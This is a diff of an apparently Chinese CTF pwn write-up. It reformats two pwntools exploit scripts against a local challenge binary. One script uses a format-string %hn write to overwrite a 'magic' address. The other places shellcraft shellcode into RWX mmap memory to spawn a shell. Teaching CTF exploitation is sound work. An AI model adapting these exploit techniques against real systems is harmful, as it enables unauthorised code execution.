@@ -21,180 +21,25 @@ by Maple
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
 #libc = ELF("./libc.so.6")
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
-
+p = process('./pwn')
 #gdb.attach(p)
 
-magic
+magic = 0x00000000004CA2F0
+num = 0x32107654ba98fedc
 
-=
+payload = f"%{0x3210}c%18$hn%{0x7654-0x3210}c%19$hn%{0xba98-0x7654}c%20$hn%{0xfedc-0xba98}c%21$hn".encode()
+payload = payload.ljust(0x50,b'a')
+payload+=p64(magic+6)+p64(magic+4)+p64(magic+2)+p64(magic)
+p.sendline(payload)
 
-0x00000000004CA2F0
-
-num
-
-=
-
-0x32107654ba98fedc
-
-payload
-
-=
-
-f
-"%
-{
-0x3210
-}
-c%18$hn%
-{
-0x7654
--
-0x3210
-}
-c%19$hn%
-{
-0xba98
--
-0x7654
-}
-c%20$hn%
-{
-0xfedc
--
-0xba98
-}
-c%21$hn"
-.
-encode
-()
-
-payload
-
-=
-
-payload
-.
-ljust
-(
-0x50
-,
-b
-'a'
-)
-
-payload
-+=
-p64
-(
-magic
-+
-6
-)
-+
-p64
-(
-magic
-+
-4
-)
-+
-p64
-(
-magic
-+
-2
-)
-+
-p64
-(
-magic
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+p.interactive()
 ```
 
 
@@ -215,27 +60,10 @@ interactive
 
 
 ```
-
-0x4CA2F0
-
-\
-0xFEDC
-
-0x4CA2F2
-
-\
-0xBA98
-
-0x4CA2F4
-
-\
-0x7654
-
-0x4CA2F6
-
-\
-0x3210
-
+0x4CA2F0    \0xFEDC
+0x4CA2F2    \0xBA98
+0x4CA2F4    \0x7654
+0x4CA2F6    \0x3210
 ```
 
 所以我们将这些两字节的数字依次写入
@@ -263,110 +91,15 @@ interactive
 菜单题，主要是考察mmap函数，将需要的东西输入好，直接写入shellcode就行
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-context
-.
-arch
-
-=
-
-'amd64'
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
-
-p
-.
-sendlineafter
-(
-'exit'
-,
-b
-'1'
-)
-
-p
-.
-sendlineafter
-(
-'id'
-,
-b
-'1'
-)
-
-p
-.
-sendlineafter
-(
-'addr: '
-,
-str
-(
-0x1337000
-))
-
-p
-.
-sendlineafter
-(
-'length: '
-,
-str
-(
-0x100
-))
-
-p
-.
-sendlineafter
-(
-'mode: '
-,
-str
-(
-7
-))
-
-p
-.
-sendafter
-(
-'note: '
-,
-asm
-(
-shellcraft
-.
-sh
-())
-.
-ljust
-(
-0x100
-,
-b
-'a'
-))
-
-p
-.
-interactive
-()
-
+```python
+from pwn import *
+context.arch  = 'amd64'
+p = process('./pwn')
+p.sendlineafter('exit',b'1')
+p.sendlineafter('id',b'1')
+p.sendlineafter('addr: ',str(0x1337000))
+p.sendlineafter('length: ',str(0x100))
+p.sendlineafter('mode: ',str(7))
+p.sendafter('note: ',asm(shellcraft.sh()).ljust(0x100,b'a'))
+p.interactive()
 ```
